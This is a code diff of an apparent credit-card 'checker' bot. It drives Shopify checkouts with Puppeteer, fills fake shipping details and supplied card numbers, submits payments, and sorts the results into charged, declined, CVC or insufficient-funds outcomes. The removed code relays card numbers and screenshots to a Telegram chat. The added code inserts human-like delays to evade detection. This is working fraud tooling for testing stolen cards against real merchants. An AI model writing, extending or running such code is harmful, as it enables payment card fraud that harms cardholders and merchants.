-    // ---- Fill Shipping ----
-    await fillField(page, [
-      'input[name="firstName"]',
-      'input[autocomplete="given-name"]',
-      '#TextField1',
-      'input[id*="firstName" i]'
-    ], "John");
-
-    await fillField(page, [
-      'input[name="lastName"]',
-      'input[autocomplete="family-name"]',
-      '#TextField2',
-      'input[id*="lastName" i]'
-    ], "Doe");
-
-    await fillField(page, [
-      'input[name="address1"]',
-      'input[autocomplete="shipping address-line1"]',
-      '#TextField3',
-      'input[id*="address1" i]'
-    ], "123 Main Street");
-
-    await fillField(page, [
-      'input[name="city"]',
-      'input[autocomplete="shipping address-level2"]',
-      '#TextField5',
-      'input[id*="city" i]'
-    ], "New York");
-
-    // State select
-    try {
-      const stateSelectors = [
-        'select[name="zone"]',
-        'select[name="province"]',
-        'select[id*="ProvinceCode" i]',
-        'select[autocomplete="shipping address-level1"]'
-      ];
-      for (const sel of stateSelectors) {
-        const el = await page.$(sel);
-        if (el) {
-          await page.select(sel, "NY");
-          console.log("[STATE SELECTED] NY");
-          break;
-        }
-      }
-    } catch(e) {}
-
-    await fillField(page, [
-      'input[name="zip"]',
-      'input[name="postalCode"]',
-      'input[autocomplete="shipping postal-code"]',
-      'input[id*="postalCode" i]'
-    ], "10001");
-
-    await fillField(page, [
-      'input[name="phone"]',
-      'input[autocomplete="tel"]',
-      'input[id*="phone" i]'
-    ], "2125551234");
-
-    await sleep(1000);
-
-    // Screenshot after filling
-    const ssAfterFill = await takeScreenshot(page);
-    await sendScreenshot(bot, chatId, ssAfterFill,
-      "📝 <b>[4/6]</b> Details Filled\n💳 <code>" + escapeHTML(ccInput) + "</code>"
-    );
-
-    // ---- Click Continue to Shipping ----
-    const continueSelectors = [
-      'button[type="submit"]',
-      'button[data-trekkie-id="continue_to_shipping_button"]',
-      '.step__footer__continue-btn',
-      '#continue_button',
-      'button[id*="continue" i]'
-    ];
-
-    for (const sel of continueSelectors) {
-      try {
-        const el = await page.$(sel);
-        if (el) {
-          await el.click();
-          console.log("[CONTINUE CLICKED]", sel);
-          break;
-        }
-      } catch(e) {}
-    }
-
-    // Wait for navigation
-    await Promise.race([
-      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 }),
-      sleep(8000)
-    ]);
-    await closePopups(page);
-    await sleep(1000);
-
-    // ---- Shipping Method ----
-    console.log("[SHIPPING URL]", page.url());
-    try {
-      // Wait for shipping method to load
-      await page.waitForSelector(
-        'input[name="shipping_rate[id]"], .shipping-method__radio, [data-shipping-method]',
-        { timeout: 8000 }
-      );
-      // Select first available shipping
-      await page.evaluate(() => {
-        const radios = document.querySelectorAll('input[type="radio"][name*="shipping"]');
-        if (radios.length > 0) radios[0].click();
+    await page.evaluate(async (url, variantId) => {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: variantId, quantity: 1 }),
       });
-      console.log("[SHIPPING SELECTED]");
-      await sleep(1000);
-    } catch(e) {
-      console.log("[SHIPPING]", e.message);
-    }
+    }, cartUrl, product.variantId);
 
-    // Continue to Payment
-    for (const sel of continueSelectors) {
-      try {
-        const el = await page.$(sel);
-        if (el) {
-          await el.click();
-          console.log("[CONTINUE TO PAYMENT]", sel);
-          break;
-        }
-      } catch(e) {}
-    }
+    await humanDelay(500, 1000);
 
-    await Promise.race([
-      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 }),
-      sleep(8000)
+    // ==========================================
+    // STEP 5 — Go to Checkout
+    // ==========================================
+    console.log(`[CHECKOUT] Navigating to checkout...`);
+    await page.goto(site + "checkout", {
+      waitUntil: "domcontentloaded",
+      timeout: 30000,
+    });
+    await humanDelay(1500, 2500);
+    await dismissPopups(page);
+
+    // ==========================================
+    // STEP 6 — Fill Customer Info + Shipping
+    // ==========================================
+    console.log(`[CHECKOUT] Filling customer info...`);
+    await fillCustomerInfo(page, customer);
+    await dismissPopups(page);
+
+    // ==========================================
+    // STEP 7 — Fill Card Details
+    // ==========================================
+    console.log(`[PAYMENT] Filling card details...`);
+    await fillCardDetails(page, cc, customer);
+    await humanDelay(500, 1000);
+
+    // ==========================================
+    // STEP 8 — Submit Payment
+    // ==========================================
+    console.log(`[PAYMENT] Submitting payment...`);
+    await clickButton(page, [
+      'button[type="submit"]',
+      '#continue_button',
+      '[data-testid="continue-button"]',
+      'button[id*="pay"]',
+      'button[class*="pay"]',
+      'button[class*="Pay"]',
+      'input[type="submit"]',
     ]);
-    await closePopups(page);
-    await sleep(2000);
-
-    // ============ STEP 5 — Payment ============
-    await onStep(
-      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
-      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
-      "✅ <b>[1/6]</b> Browser ready!\n" +
-      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
-      "✅ <b>[3/6]</b> Added to cart!\n" +
-      "✅ <b>[4/6]</b> Checkout loaded!\n" +
-      "🔄 <b>[5/6]</b> Filling payment...\n🟩🟩🟩🟩⬜⬜"
-    );
-
-    const payUrl = page.url();
-    console.log("[PAYMENT URL]", payUrl);
-
-    // Screenshot payment page
-    const ss3 = await takeScreenshot(page);
-    await sendScreenshot(bot, chatId, ss3,
-      "💳 <b>[5/6]</b> Payment Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
-    );
-
-    // Wait for iframes to load
-    await sleep(3000);
-
-    // Fill card details
-    await fillCardInFrames(page, card);
-    await sleep(1500);
-
-    // Screenshot after card fill
-    const ss4 = await takeScreenshot(page);
-    await sendScreenshot(bot, chatId, ss4,
-      "📤 <b>[5/6]</b> Card Filled — Submitting...\n💳 <code>" + escapeHTML(ccInput) + "</code>"
-    );
-
-    // Click Pay button
-    await clickPayButton(page);
 
     // Wait for result
-    await Promise.race([
-      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 20000 }),
-      sleep(12000)
-    ]);
-    await sleep(2000);
+    await humanDelay(4000, 6000);
 
-    // ============ STEP 6 — Result ============
-    await onStep(
-      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
-      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
-      "✅ <b>[1/6]</b> Browser ready!\n" +
-      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
-      "✅ <b>[3/6]</b> Added to cart!\n" +
-      "✅ <b>[4/6]</b> Checkout loaded!\n" +
-      "✅ <b>[5/6]</b> Payment submitted!\n" +
-      "🔄 <b>[6/6]</b> Getting result...\n🟩🟩🟩🟩🟩⬜"
-    );
-
+    // ==========================================
+    // STEP 9 — Parse Result
+    // ==========================================
     const finalUrl = page.url();
-    console.log("[FINAL URL]", finalUrl);
+    const content = await page.content();
 
-    // Screenshot result
-    const ss5 = await takeScreenshot(page);
-    await sendScreenshot(bot, chatId, ss5,
-      "🎯 <b>[6/6]</b> Result Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
-    );
+    console.log(`[RESULT] Final URL: ${finalUrl}`);
+    const result = parseResult(finalUrl, content);
+    console.log(`[RESULT] ${JSON.stringify(result)}`);
 
-    let paymentResponse = "DECLINED";
-    let category = "declined";
+    await browser.close();
+    return result;
 
-    // Check URL
-    if (finalUrl.includes("thank_you") || finalUrl.includes("orders") || finalUrl.includes("order-status")) {
-      paymentResponse = "APPROVED - ORDER PLACED";
-      category = "charged";
-    } else {
-      // Get page text
-      const pageText = await page.evaluate(() => document.body.innerText || "").catch(() => "");
-      const upperText = pageText.toUpperCase();
-      console.log("[PAGE TEXT]", upperText.substring(0, 300));
-
-      // Check error messages
-      const errorSelectors = [
-        '[class*="error" i]',
-        '[class*="decline" i]',
-        '.notice--error',
-        '.field__message--error',
-        '[data-error]',
-        '.payment-errors',
-        '[class*="alert" i]',
-        '.Polaris-Banner--statusCritical'
-      ];
-
-      let errorMsg = "";
-      for (const sel of errorSelectors) {
-        try {
-          const el = await page.$(sel);
-          if (el) {
-            const txt = await page.evaluate(e => e.innerText, el);
-            if (txt && txt.trim().length > 2) {
-              errorMsg = txt.trim();
-              console.log("[ERROR MSG]", errorMsg);
-              break;
-            }
-          }
-        } catch(e) {}
-      }
-
-      if (errorMsg) {
-        paymentResponse = errorMsg.toUpperCase();
-      } else if (upperText.includes("THANK YOU") || upperText.includes("ORDER CONFIRMED")) {
-        paymentResponse = "APPROVED";
-        category = "charged";
-      } else if (upperText.includes("3D SECURE") || upperText.includes("AUTHENTICATION REQUIRED")) {
-        paymentResponse = "3DS_REQUIRED";
-      } else if (upperText.includes("OTP")) {
-        paymentResponse = "OTP_REQUIRED";
-      } else if (upperText.includes("SECURITY CODE") || upperText.includes("INCORRECT CVC")) {
-        paymentResponse = "INCORRECT_CVC";
-      } else if (upperText.includes("DECLINED") || upperText.includes("FAILED")) {
-        paymentResponse = "CARD_DECLINED";
-      } else if (upperText.includes("INSUFFICIENT")) {
-        paymentResponse = "INSUFFICIENT_FUNDS";
-      } else {
-        paymentResponse = "DECLINED";
-      }
-
-      if (category !== "charged") {
-        category = classifyResponse(paymentResponse, false);
-      }
-    }
-
-    await binPromise;
-
-    return {
-      success: true,
-      response: paymentResponse,
-      category,
-      product,
-      binInfo,
-      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2)
-    };
-
-  } catch(err) {
-    console.error("[MAIN ERROR]", err.message);
-
+  } catch (err) {
+    console.error("[CHECKER] Fatal Error:", err.message);
     if (browser) {
-      try {
-        const pages = await browser.pages();
-        if (pages[0]) {
-          const errSs = await takeScreenshot(pages[0]);
-          await sendScreenshot(bot, chatId, errSs,
-            "❌ <b>Error:</b> <code>" + escapeHTML(err.message) + "</code>"
-          );
-        }
-      } catch(e) {}
+      try { await browser.close(); } catch (e) {}
     }
-
-    await binPromise;
     return {
-      success: false,
-      response: "ERROR: " + err.message,
-      category: "declined",
-      binInfo,
-      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
-      product: null
+      Status: false,
+      Response: "ERROR: " + err.message,
+      Gateway: "Shopify Payments",
     };
-
-  } finally {
-    if (browser) {
-      try { await browser.close(); } catch(e) {}
-    }
   }
 }
 
-module.exports = { checkCard, classifyResponse };
+module.exports = { checkShopify };
